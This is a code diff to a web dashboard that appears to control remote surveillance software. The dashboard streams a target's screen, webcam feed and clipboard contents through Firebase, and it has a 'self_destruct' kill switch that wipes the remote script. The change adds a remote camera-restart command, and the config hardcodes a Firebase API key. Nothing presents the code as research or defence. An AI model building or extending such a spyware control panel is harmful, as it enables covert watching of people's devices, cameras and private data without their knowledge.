@@ -44,10 +44,17 @@
             </div>
 
             <!-- Floating Camera Feed -->
-            <div class="absolute bottom-4 right-4 w-48 aspect-video bg-slate-800 border-2 border-slate-700 rounded-lg shadow-2xl overflow-hidden group">
-                <div class="absolute inset-0 flex items-center justify-center text-[10px] text-slate-500 font-mono" id="cam-placeholder">CAM OFF</div>
+            <div class="absolute bottom-4 right-4 w-56 aspect-video bg-slate-800 border-2 border-slate-700 rounded-lg shadow-2xl overflow-hidden group">
+                <div class="absolute inset-0 flex flex-col items-center justify-center gap-2 text-[10px] text-slate-500 font-mono" id="cam-placeholder">
+                    <span>CAM OFF / MOTION DETECTED</span>
+                    <button onclick="resetCamera()" class="bg-blue-600 hover:bg-blue-500 text-white px-3 py-1 rounded font-bold shadow-lg">RESTART CAMERA</button>
+                </div>
                 <img id="cam-img" src="" class="absolute inset-0 w-full h-full object-cover hidden">
-                <div class="absolute top-1 left-1 bg-black/60 px-1.5 py-0.5 rounded text-[8px] font-bold">REC</div>
+                <div class="absolute top-1 left-1 bg-black/60 px-1.5 py-0.5 rounded text-[8px] font-bold flex items-center gap-1">
+                    <span class="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse"></span> REC
+                </div>
+                <!-- Mini Toggle Overlay on Hover -->
+                <button onclick="resetCamera()" class="absolute bottom-1 right-1 opacity-0 group-hover:opacity-100 bg-black/80 p-1 rounded text-[9px] transition-opacity">🔄 Reset</button>
             </div>
         </div>
 
@@ -79,7 +86,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit, updateDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
         const firebaseConfig = { 
             apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk", 
@@ -109,6 +116,10 @@
             });
         }
 
+        window.resetCamera = () => {
+            sendAction({ type: 'reset_camera' });
+        };
+
         document.getElementById('kill-switch').onclick = () => {
             if(confirm("Permanently wipe script?")) sendAction({ type: 'self_destruct' });
         };
@@ -125,7 +136,6 @@
         };
 
         function initSync() {
-            // Screen Sync
             onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
                 if(snap.exists()){
                     const d = snap.data();
@@ -137,7 +147,6 @@
                 }
             });
 
-            // Camera Sync
             onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
                 if(snap.exists()){
                     const d = snap.data();
@@ -148,11 +157,14 @@
                     } else {
                         camImg.classList.add('hidden');
                     }
-                    if(d.motion) camStatus.className = "text-red-500 font-black animate-pulse";
+                    if(d.motion) {
+                        camStatus.className = "text-red-500 font-black animate-pulse";
+                    } else {
+                        camStatus.className = "text-blue-400 font-bold";
+                    }
                 }
             });
 
-            // Clipboard
             const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(5));
             onSnapshot(q, (snap) => {
                 const list = document.getElementById('clipboard-list');
